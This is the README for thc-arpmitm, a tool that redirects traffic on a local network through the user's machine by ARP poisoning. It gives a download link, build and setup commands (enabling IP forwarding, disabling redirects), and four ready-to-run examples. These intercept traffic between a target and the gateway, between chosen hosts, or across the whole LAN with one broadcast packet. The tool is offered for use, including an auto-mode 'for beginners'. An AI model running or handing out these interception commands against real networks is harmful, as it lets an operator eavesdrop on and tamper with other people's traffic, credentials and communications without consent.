# ARP Man-in-the-Middle

A tool to redirect hosts on a local network to your own computer (to intercept the traffic - aka ARP poisoning).  

Direct Download: [https://github.com/hackerschoice/thc-arpmitm/tree/master/releases](https://github.com/hackerschoice/thc-arpmitm/tree/master/releases)

**Install:**
```
$ ./configure --enable-static
$ make all
```

Setup:
```
echo 1 >/proc/sys/net/ipv4/ip_forward
echo 0 | tee /proc/sys/net/ipv4/conf/*/send_redirects
```

**Example 1:**
```
# ./thc-arpmitm -t 10.0.1.111
```
The above redirects all traffic between the target '10.0.1.111' and the Internet through your computer.

**Example 2:**
```
arpmim -v 00:02:13:37:73:50 10.0.1.254:11:11:22:22:33:33 10.0.1.111:44:44:55:55:66:66
```
A classic redirect. The above redirects all traffic between 10.0.1.254 and 10.0.1.111 through your computer. Where 10.0.1.254 is the default gateway then this makes it identical to Example 1. Example 1 finds out all the MAC's automatically.

**Example 3:**
```
# ./thc-arpmitm 00:02:13:37:73:50 255.255.255.255 10.0.1.254
```
The above will use 1 broadcast packet to tell *everyone* that 10.0.1.254 is you now.

**Example 4 the bold:**
```
# ./thc-arpmitm -A 00:02:13:37:73:50 255.255.255.255 10.0.0.1 10.0.0.2 10.0.0.3 10.0.0.4
```
The above will redirect all local traffic between the 4 hosts through your computer.

**Features:**
- Auto-Mode
- Broadcast Mode: Send 1 ARP-broadcast to ALL hosts and redirect ALL hosts with a single packet (be warned!)

**Supported Platforms:**
1. Linux
1. MacOS
1. FreeBSD

**Changelog:**  
2000 Internal team-teso release by xdr/skyper  
2001 Leaked to the public  
2020 Resurrection. Portability and added AUTO-MODE for beginners.  
2040 stay tuned!!!  

shoutz :+1: #oscar, ADM

